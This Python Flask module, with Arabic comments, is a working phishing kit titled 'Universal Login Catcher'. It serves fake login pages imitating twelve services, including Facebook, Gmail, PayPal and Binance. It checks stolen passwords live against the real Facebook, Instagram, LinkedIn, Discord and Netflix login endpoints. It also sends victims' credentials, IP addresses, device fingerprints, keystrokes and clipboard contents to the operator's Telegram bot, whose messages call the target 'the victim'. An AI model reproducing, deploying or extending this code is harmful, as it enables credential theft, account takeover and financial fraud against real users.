# session_hunter.py
# ============================================================
# Universal Login Catcher v4 — مع التحقق الفعلي
# يدعم 12 موقع + فحص البيانات مع السيرفرات الحقيقية
# ============================================================

import os
import json
import time
import threading
import uuid
import re
import requests
import redis
from flask import Blueprint, request, jsonify

from logging_config import get_logger
from monitoring import metrics
from session_hunter_templates import build_login_page, build_dashboard

logger = get_logger("session_hunter")

sh_bp = Blueprint('session_hunter', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    logger.warning("⚠️ REDIS_URL not set - SH will use its own connection")

# نظّف الرابط
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if REDIS_URL and not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    if REDIS_URL:
        redis_client = redis.Redis.from_url(
            REDIS_URL, decode_responses=True, socket_timeout=15
        )
        redis_client.ping()
        logger.info("Session Hunter: Redis connected")
    else:
        redis_client = None
except Exception as e:
    logger.error(f"SH Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "daf-production-e34a.up.railway.app")

# ============================================================
# [2] المواقع المدعومة
# ============================================================
SUPPORTED_SITES = {
    "facebook": {
        "name": "فيسبوك", "name_en": "Facebook",
        "color": "#1877f2", "color_dark": "#166fe5",
        "logo": "https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg",
        "login_url": "https://www.facebook.com/login.php",
        "real_url": "https://www.facebook.com",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "pass",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب جديد",
        "bg": "#f0f2f5", "card_bg": "#ffffff", "text_color": "#1c1e21", "border": "#dddfe2",
    },
    "instagram": {
        "name": "انستقرام", "name_en": "Instagram",
        "color": "#0095f6", "color_dark": "#0081d6",
        "logo": "https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png",
        "login_url": "https://www.instagram.com/accounts/login/",
        "real_url": "https://www.instagram.com",
        "username_field": "username",
        "username_placeholder": "رقم الهاتف أو البريد أو اسم المستخدم",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب جديد",
        "bg": "#fafafa", "card_bg": "#ffffff", "text_color": "#262626", "border": "#dbdbdb",
    },
    "tiktok": {
        "name": "تيك توك", "name_en": "TikTok",
        "color": "#fe2c55", "color_dark": "#e01e46",
        "logo": "https://www.tiktok.com/favicon.ico",
        "login_url": "https://www.tiktok.com/login",
        "real_url": "https://www.tiktok.com",
        "username_field": "username",
        "username_placeholder": "البريد الإلكتروني أو اسم المستخدم",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#000000", "card_bg": "#121212", "text_color": "#ffffff", "border": "#2f2f2f",
    },
    "twitter": {
        "name": "تويتر / X", "name_en": "Twitter",
        "color": "#1d9bf0", "color_dark": "#1a8cd8",
        "logo": "https://abs.twimg.com/responsive-web/client-web/icon-ios.77d25eba.png",
        "login_url": "https://twitter.com/i/flow/login",
        "real_url": "https://twitter.com",
        "username_field": "text",
        "username_placeholder": "رقم الهاتف أو البريد الإلكتروني",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#000000", "card_bg": "#000000", "text_color": "#e7e9ea", "border": "#2f3336",
    },
    "gmail": {
        "name": "جيميل", "name_en": "Gmail",
        "color": "#1a73e8", "color_dark": "#1557b0",
        "logo": "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png",
        "login_url": "https://accounts.google.com/signin",
        "real_url": "https://mail.google.com",
        "username_field": "identifier",
        "username_placeholder": "البريد الإلكتروني أو الهاتف",
        "password_field": "password",
        "password_placeholder": "أدخل كلمة المرور",
        "button_text": "التالي",
        "forgot_text": "هل نسيت كلمة المرور؟",
        "signup_text": "إنشاء حساب",
        "bg": "#ffffff", "card_bg": "#ffffff", "text_color": "#202124", "border": "#dadce0",
    },
    "snapchat": {
        "name": "سناب شات", "name_en": "Snapchat",
        "color": "#fffc00", "color_dark": "#e6e300",
        "logo": "https://accounts.snapchat.com/accounts/static/images/ghost.svg",
        "login_url": "https://accounts.snapchat.com/accounts/login",
        "real_url": "https://web.snapchat.com",
        "username_field": "username",
        "username_placeholder": "اسم المستخدم أو البريد",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#fffc00", "card_bg": "#ffffff", "text_color": "#000000", "border": "#e0e0e0",
    },
    "linkedin": {
        "name": "لينكد إن", "name_en": "LinkedIn",
        "color": "#0a66c2", "color_dark": "#004182",
        "logo": "https://static.licdn.com/aero-v1/sc/h/akt4ae504epesldzj74dzred8",
        "login_url": "https://www.linkedin.com/login",
        "real_url": "https://www.linkedin.com",
        "username_field": "session_key",
        "username_placeholder": "البريد الإلكتروني أو الهاتف",
        "password_field": "session_password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "انضم الآن",
        "bg": "#f3f2ef", "card_bg": "#ffffff", "text_color": "#000000", "border": "#e0e0e0",
    },
    "discord": {
        "name": "ديسكورد", "name_en": "Discord",
        "color": "#5865f2", "color_dark": "#4752c4",
        "logo": "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6ca814282eca7172c6_icon_clyde_white_RGB.svg",
        "login_url": "https://discord.com/login",
        "real_url": "https://discord.com/channels/@me",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#313338", "card_bg": "#313338", "text_color": "#dbdee1", "border": "#202225",
    },
    "telegram": {
        "name": "تلجرام", "name_en": "Telegram",
        "color": "#2aabee", "color_dark": "#229ed9",
        "logo": "https://telegram.org/img/t_logo.png",
        "login_url": "https://web.telegram.org/k/",
        "real_url": "https://web.telegram.org",
        "username_field": "phone",
        "username_placeholder": "رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل تحتاج إلى مساعدة؟",
        "signup_text": "تسجيل جديد",
        "bg": "#17212b", "card_bg": "#232e3c", "text_color": "#ffffff", "border": "#101921",
    },
    "netflix": {
        "name": "نتفليكس", "name_en": "Netflix",
        "color": "#e50914", "color_dark": "#c40812",
        "logo": "https://assets.nflxext.com/ffe/siteui/common/icons/nficon2016.ico",
        "login_url": "https://www.netflix.com/login",
        "real_url": "https://www.netflix.com/browse",
        "username_field": "userLoginId",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "الاشتراك",
        "bg": "#000000", "card_bg": "#000000", "text_color": "#ffffff", "border": "#333333",
    },
    "paypal": {
        "name": "باي بال", "name_en": "PayPal",
        "color": "#0070ba", "color_dark": "#005ea6",
        "logo": "https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-color.svg",
        "login_url": "https://www.paypal.com/signin",
        "real_url": "https://www.paypal.com",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#f7f9fc", "card_bg": "#ffffff", "text_color": "#2c2e2f", "border": "#e0e0e0",
    },
    "binance": {
        "name": "بينانس", "name_en": "Binance",
        "color": "#f0b90b", "color_dark": "#d4a40a",
        "logo": "https://bin.bnbstatic.com/static/images/favicon.ico",
        "login_url": "https://accounts.binance.com/login",
        "real_url": "https://www.binance.com",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#0b0e11", "card_bg": "#1e2329", "text_color": "#eaecef", "border": "#2b3139",
    },
}

# ============================================================
# [3] إدارة الجلسات
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id, target_site="facebook"):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "target_site": target_site,
            "created_at": time.time(),
            "last_seen": time.time(),
            "captured_credentials": [],
            "captured_ip": None,
            "page_views": 0,
            "failed_attempts": 0,
        }
    if redis_client:
        try:
            redis_client.setex(f"sh_session:{session_id}", 86400 * 7, json.dumps({
                "chat_id": chat_id,
                "target_site": target_site,
            }))
        except Exception as e:
            logger.warning(f"Redis save session error: {e}")
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


# ============================================================
# [4] ★★★ التحقق الفعلي من البيانات ★★★
# ============================================================
def verify_credentials(site_key, username, password, source_ip):
    """يتحقق من البيانات مع الموقع الحقيقي"""
    try:
        logger.info(f"[VERIFY] {site_key} | user={username[:30]} | pass_len={len(password)}")

        verifiers = {
            "facebook": _verify_facebook,
            "instagram": _verify_instagram,
            "linkedin": _verify_linkedin,
            "discord": _verify_discord,
            "netflix": _verify_netflix,
            "gmail": _verify_gmail,
            "twitter": _verify_twitter,
            "tiktok": _verify_tiktok,
            "snapchat": _verify_snapchat,
            "telegram": _verify_telegram,
            "paypal": _verify_paypal,
            "binance": _verify_binance,
        }

        verifier = verifiers.get(site_key)
        if not verifier:
            return (True, "unknown_site")

        return verifier(username, password)

    except Exception as e:
        logger.exception(f"verify error: {e}")
        return (False, f"error: {str(e)}")


def _verify_facebook(username, password):
    """التحقق من Facebook"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
        }

        r1 = session.get("https://m.facebook.com/login.php", headers=headers, timeout=20)

        lsd_match = re.search(r'name="lsd"\s+value="([^"]+)"', r1.text)
        lsd = lsd_match.group(1) if lsd_match else ""

        jazoest_match = re.search(r'name="jazoest"\s+value="([^"]+)"', r1.text)
        jazoest = jazoest_match.group(1) if jazoest_match else ""

        login_data = {
            "email": username,
            "pass": password,
            "lsd": lsd,
            "jazoest": jazoest,
            "login": "تسجيل الدخول",
            "default_persistent": "0",
            "timezone": "0",
            "lgndim": "",
            "lgnrnd": "",
            "lgnjs": "",
            "locale": "ar_AR",
        }

        headers2 = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://m.facebook.com",
            "Referer": "https://m.facebook.com/login.php",
        }

        r2 = session.post(
            "https://m.facebook.com/login/device-based/regular/login/",
            data=login_data,
            headers=headers2,
            allow_redirects=True,
            timeout=20,
        )

        text = r2.text.lower()
        cookies = session.cookies.get_dict()

        if "c_user" in cookies and cookies.get("c_user", ""):
            logger.info(f"[FB VERIFY] LOGIN SUCCESS - c_user={cookies['c_user']}")
            return (True, "login_success")

        if "كلمة السر غير صحيحة" in r2.text:
            return (False, "wrong_password")
        if "password you entered is incorrect" in text:
            return (False, "wrong_password")
        if "البريد الإلكتروني أو رقم الهاتف غير صحيح" in r2.text:
            return (False, "wrong_username")
        if "البريد الإلكتروني الذي أدخلته غير صحيح" in r2.text:
            return (False, "wrong_username")
        if "too many" in text and ("attempt" in text or "try" in text):
            return (False, "rate_limited")
        if "checkpoint" in r2.url.lower():
            return (False, "checkpoint")
        if "/login/" in r2.url.lower() and "login_attempt" in text:
            return (False, "invalid_credentials")

        if "facebook.com/home" in r2.url or "m.facebook.com/?_rdr" in r2.url:
            return (True, "login_success")

        return (False, "unknown")

    except requests.exceptions.Timeout:
        return (False, "timeout")
    except Exception as e:
        logger.exception(f"FB verify error: {e}")
        return (False, f"exception: {str(e)[:50]}")


def _verify_instagram(username, password):
    """التحقق من Instagram"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "ar,en;q=0.9",
            "X-IG-App-ID": "936619743392459",
        }

        session.get("https://www.instagram.com/", headers=headers, timeout=20)
        csrf = session.cookies.get("csrftoken", "")

        headers2 = {
            **headers,
            "X-CSRFToken": csrf,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        login_data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
        }

        r2 = session.post(
            "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
            data=login_data,
            headers=headers2,
            timeout=20,
        )

        try:
            result = r2.json()
            logger.debug(f"[IG VERIFY] result={result}")

            if result.get("authenticated") == True:
                return (True, "login_success")
            if result.get("user") == False or "checkpoint" in str(result).lower():
                return (False, "checkpoint")
            if result.get("message") == "challenge_required":
                return (False, "challenge")
            if "password" in str(result).lower():
                return (False, "wrong_password")
            if result.get("authenticated") == False:
                return (False, "invalid_credentials")
        except Exception as e:
            logger.warning(f"IG JSON parse error: {e}")

        return (False, "unknown")
    except Exception as e:
        logger.exception(f"IG verify error: {e}")
        return (False, "exception")


def _verify_linkedin(username, password):
    """التحقق من LinkedIn"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept-Language": "ar,en;q=0.9",
        }
        session.get("https://www.linkedin.com/login", headers=headers, timeout=20)
        csrf = session.cookies.get("JSESSIONID", "").strip('"')

        login_data = {
            "session_key": username,
            "session_password": password,
            "csrfToken": csrf,
        }

        r2 = session.post(
            "https://www.linkedin.com/uas/login-submit",
            data=login_data,
            headers=headers,
            allow_redirects=True,
            timeout=20,
        )

        if "li_at" in session.cookies.get_dict():
            return (True, "login_success")

        text = r2.text.lower()
        if "كلمة السر" in r2.text and "غير صحيحة" in r2.text:
            return (False, "wrong_password")
        if "this password isn't right" in text or "incorrect password" in text:
            return (False, "wrong_password")

        return (False, "unknown")
    except Exception as e:
        logger.exception(f"LinkedIn verify error: {e}")
        return (False, "exception")


def _verify_discord(username, password):
    """التحقق من Discord"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Content-Type": "application/json",
        }

        r = session.post(
            "https://discord.com/api/v9/auth/login",
            json={
                "login": username,
                "password": password,
                "undelete": False,
                "captcha_key": None,
                "login_source": None,
                "gift_code_sku_id": None,
            },
            headers=headers,
            timeout=20,
        )

        try:
            result = r.json()
            logger.debug(f"[DC VERIFY] result={str(result)[:200]}")

            if "token" in result:
                return (True, "login_success")
            if result.get("code") == 50035:
                return (False, "invalid_credentials")
            if "captcha" in str(result).lower():
                return (False, "captcha")
            if "invalid" in str(result).lower():
                return (False, "invalid_credentials")
        except Exception as e:
            logger.warning(f"DC JSON error: {e}")

        return (False, "unknown")
    except Exception as e:
        logger.exception(f"Discord verify error: {e}")
        return (False, "exception")


def _verify_netflix(username, password):
    """التحقق من Netflix"""
    try:
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept-Language": "ar,en;q=0.9",
        }

        session.get("https://www.netflix.com/login", headers=headers, timeout=20)

        login_data = {
            "userLoginId": username,
            "password": password,
            "rememberMe": "true",
            "flow": "websiteSignUp",
            "mode": "login",
            "action": "loginAction",
            "withFields": "rememberMe,nextPage,authURL",
            "authURL": "",
        }

        r2 = session.post(
            "https://www.netflix.com/api/login",
            data=login_data,
            headers=headers,
            timeout=20,
        )

        if "NetflixId" in session.cookies.get_dict():
            return (True, "login_success")

        text = r2.text.lower()
        if "incorrect" in text or "wrong" in text or "كلمة السر" in r2.text:
            return (False, "wrong_password")

        return (False, "unknown")
    except Exception as e:
        logger.exception(f"Netflix verify error: {e}")
        return (False, "exception")


# ============================================================
# دوال للمواقع بدون تحقق كامل
# ============================================================
def _verify_gmail(username, password):
    return (True, "assumed_valid")


def _verify_twitter(username, password):
    return (True, "assumed_valid")


def _verify_tiktok(username, password):
    return (True, "assumed_valid")


def _verify_snapchat(username, password):
    return (True, "assumed_valid")


def _verify_telegram(username, password):
    return (True, "assumed_valid")


def _verify_paypal(username, password):
    return (True, "assumed_valid")


def _verify_binance(username, password):
    return (True, "assumed_valid")


# ============================================================
# [5] توليد صفحة تسجيل الدخول
# ============================================================
def generate_login_page(session_id, chat_id, site_key):
    """يولّد صفحة تسجيل دخول باستخدام template"""
    site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
    return build_login_page(session_id, chat_id, site_key, site, RAILWAY_URL)


# ============================================================
# [6] المسارات
# ============================================================
def init_session_hunter_routes(app, bot):

    @app.route('/sh', methods=['GET'])
    def sh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        site = request.args.get('site', 'facebook').lower()

        if not session_id or not chat_id:
            return "Invalid link", 400

        if site not in SUPPORTED_SITES:
            site = 'facebook'

        sess = get_session(session_id)
        if not sess:
            create_session(session_id, chat_id, site)
            sess = get_session(session_id)

        sess["page_views"] = sess.get("page_views", 0) + 1
        sess["last_seen"] = time.time()

        source_ip = (request.headers.get('CF-Connecting-IP') or
                     request.headers.get('X-Forwarded-For') or
                     request.remote_addr or "Unknown")
        if ',' in source_ip:
            source_ip = source_ip.split(',')[0].strip()

        sess["captured_ip"] = source_ip
        metrics.inc_counter("sh_page_view", tags={"site": site})

        if sess["page_views"] == 1:
            try:
                bot.send_message(
                    int(chat_id) if str(chat_id).isdigit() else chat_id,
                    f"🎯 **الضحية فتح رابط {SUPPORTED_SITES[site]['name']}!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 `{session_id[:16]}`\n"
                    f"🌐 IP: `{source_ip}`\n"
                    f"🎯 الموقع: **{SUPPORTED_SITES[site]['name']}**\n\n"
                    f"⏳ في انتظار إدخال البيانات...",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.warning(f"notify landing error: {e}")

        html = generate_login_page(session_id, chat_id, site)
        return html, 200

    @app.route('/sh_create', methods=['POST'])
    def sh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        site = data.get('site', 'facebook')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id, site)
        return jsonify({"session_id": session_id}), 200

    @app.route('/sh_verify', methods=['POST'])
    def sh_verify():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            site_key = data.get('site', 'facebook')
            username = data.get('username', '').strip()
            password = data.get('password', '')
            attempt = data.get('attempt', 1)

            if not session_id or not username or not password:
                return jsonify({"status": "invalid"}), 200

            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            is_valid, reason = verify_credentials(site_key, username, password, source_ip)

            site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id

            logger.info(
                f"[SH VERIFY] site={site_key} | user={username[:30]} | "
                f"valid={is_valid} | reason={reason} | attempt={attempt}"
            )

            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()

            if is_valid:
                cred_data = {
                    "site": site_key,
                    "site_name": site.get("name", site_key),
                    "username": username,
                    "password": password,
                    "ip": source_ip,
                    "verified": True,
                    "reason": reason,
                    "attempt": attempt,
                    "captured_at": time.time(),
                }

                if redis_client:
                    try:
                        redis_client.lpush(
                            f"sh_creds:{session_id}",
                            json.dumps(cred_data, ensure_ascii=False)
                        )
                        redis_client.expire(f"sh_creds:{session_id}", 86400 * 7)
                    except Exception as e:
                        logger.warning(f"Redis save creds error: {e}")

                if sess:
                    sess.setdefault("captured_credentials", []).append(cred_data)

                metrics.inc_counter("sh_credentials_valid", tags={"site": site_key})

                try:
                    msg = (
                        f"🎯 **بيانات حقيقية تم التحقق منها!**\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"✅ **تم التحقق:** البيانات صحيحة 100%\n"
                        f"🌐 **الموقع:** {site.get('name', site_key)}\n"
                        f"🆔 **الجلسة:** `{session_id[:16]}`\n"
                        f"🔢 **المحاولة:** {attempt}\n\n"
                        f"👤 **اسم المستخدم / البريد:**\n"
                        f"`{username}`\n\n"
                        f"🔑 **كلمة السر:**\n"
                        f"`{password}`\n\n"
                        f"🌍 **IP:** `{source_ip}`\n"
                        f"🕐 **الوقت:** `{time.strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"💡 **يمكنك الآن استخدام هذه البيانات للدخول!**\n"
                        f"🔓 الرابط: {site.get('real_url', '')}"
                    )
                    bot.send_message(cid, msg, parse_mode="Markdown",
                                     disable_web_page_preview=True)
                except Exception as e:
                    logger.warning(f"notify error: {e}")

                return jsonify({"status": "valid"}), 200

            else:
                if sess:
                    sess["failed_attempts"] = sess.get("failed_attempts", 0) + 1

                metrics.inc_counter("sh_credentials_invalid", tags={"site": site_key})

                if attempt >= 3:
                    try:
                        bot.send_message(
                            cid,
                            f"⚠️ **محاولات فاشلة ({attempt})**\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"🌐 الموقع: {site.get('name', site_key)}\n"
                            f"🆔 `{session_id[:16]}`\n"
                            f"👤 آخر محاولة: `{username}`\n"
                            f"🔑 كلمة السر: `{password[:30]}`\n"
                            f"❌ **البيانات غير صحيحة** ({reason})\n"
                            f"🌍 IP: `{source_ip}`\n\n"
                            f"💡 _سيتم الإرسال فقط عند التحقق الناجح._",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        logger.warning(f"notify fail attempt error: {e}")

                return jsonify({"status": "invalid", "reason": reason}), 200

        except Exception as e:
            logger.exception(f"sh_verify error: {e}")
            return jsonify({"status": "pending"}), 200

    @app.route('/sh_data', methods=['POST'])
    def sh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            dtype = data.get('type')
            site_key = data.get('site', 'facebook')

            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 200

            sess = get_session(session_id)
            if not sess:
                create_session(session_id, chat_id, site_key)
                sess = get_session(session_id)

            sess["last_seen"] = time.time()

            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key)

            return jsonify({"status": "ok"}), 200
        except Exception as e:
            logger.exception(f"sh_data error: {e}")
            return jsonify({"status": "error"}), 200

    @app.route('/sh_view', methods=['GET'])
    def sh_view():
        session_id = request.args.get('s', '')
        if not session_id:
            return "No session", 400
        sess = get_session(session_id)
        if not sess:
            return "Session not found", 404

        site = SUPPORTED_SITES.get(sess.get("target_site", "facebook"), {})
        return build_dashboard(session_id, sess, site), 200


# ============================================================
# [7] معالجة البيانات الواردة
# ============================================================
def _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key):
    dtype = data.get('type')
    site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
    cid = int(chat_id) if str(chat_id).isdigit() else chat_id

    logger.debug(f"[SH <<] {dtype} | {site_key} | {session_id[:8]}")

    try:
        if dtype == 'device':
            fp = data
            scr = fp.get('screen', {})
            hw = fp.get('hardware', {})
            bat = fp.get('battery', {})
            net = fp.get('network', {})
            gpu = fp.get('gpu', {})
            webrtc = fp.get('webrtc_ips', [])

            text = (
                f"🖥️ **بصمة جهاز الضحية**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 الموقع: **{site['name']}**\n\n"
                f"🌐 **IP:** `{source_ip}`\n"
                f"🕵️ **WebRTC IPs:** `{', '.join(webrtc) if webrtc else 'لا يوجد'}`\n\n"
                f"💻 **النظام:** `{fp.get('platform', 'N/A')}`\n"
                f"📱 **UA:** `{fp.get('ua', 'N/A')[:120]}`\n"
                f"🌍 **اللغة:** `{fp.get('lang', 'N/A')}`\n"
                f"🕐 **التوقيت:** `{fp.get('tz', 'N/A')}`\n\n"
                f"📐 **الشاشة:** `{scr.get('w', '?')}x{scr.get('h', '?')}` "
                f"(DPR `{scr.get('dpr', '?')}`)\n"
                f"⚙️ **المعالج:** `{hw.get('cores', 'N/A')} cores` | "
                f"RAM: `{hw.get('memory', 'N/A')} GB`\n"
                f"🎮 **GPU:** `{gpu.get('vendor', 'N/A')[:50]}`\n"
                f"🔋 **البطارية:** `{bat.get('level', 'N/A')}%`\n"
                f"📶 **الشبكة:** `{net.get('type', 'N/A')}`"
            )
            bot.send_message(cid, text, parse_mode="Markdown")

        elif dtype == 'keylog':
            text = data.get('text', '')
            if text.strip():
                bot.send_message(
                    cid,
                    f"⌨️ **لوحة المفاتيح ({site['name']}):**\n```\n{text[:500]}\n```",
                    parse_mode="Markdown"
                )

        elif dtype == 'form_submit':
            fields = data.get('fields', {})
            lines = [f"📝 **نموذج ({site['name']}):**"]
            for k, v in list(fields.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

        elif dtype == 'clipboard_copy':
            content = data.get('content', '')
            if content:
                bot.send_message(cid, f"📋 **نسخ:**\n```\n{content[:300]}\n```",
                                 parse_mode="Markdown")

        elif dtype == 'clipboard_paste':
            content = data.get('content', '')
            if content:
                bot.send_message(cid, f"📥 **لصق:**\n```\n{content[:300]}\n```",
                                 parse_mode="Markdown")

    except Exception as e:
        logger.exception(f"_handle_sh_data error ({dtype}): {e}")


# ============================================================
# [8] لوحة تحكم البوت
# ============================================================
def build_sh_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📋 البيانات المسروقة", callback_data=f"sh_creds_{session_id}"),
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"sh_stats_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 عرض الويب", url=f"{RAILWAY_URL}/sh_view?s={session_id}"),
    )
    return m


# ============================================================
# [9] API للبوت
# ============================================================
def get_sh_data(session_id):
    """يرجع بيانات الجلسة"""
    result = {"credentials": [], "session": None}

    sess = get_session(session_id)
    if sess:
        result["credentials"] = sess.get("captured_credentials", [])
        result["session"] = {
            "chat_id": sess.get("chat_id"),
            "target_site": sess.get("target_site"),
            "page_views": sess.get("page_views", 0),
            "ip": sess.get("captured_ip"),
            "failed_attempts": sess.get("failed_attempts", 0),
            "created_at": sess.get("created_at"),
            "last_seen": sess.get("last_seen"),
        }

    if redis_client:
        try:
            creds_raw = redis_client.lrange(f"sh_creds:{session_id}", 0, -1)
            for c in (creds_raw or []):
                try:
                    result["credentials"].append(json.loads(c))
                except Exception as e:
                    logger.warning(f"parse creds error: {e}")
        except Exception as e:
            logger.error(f"get_sh_data error: {e}")

    return result
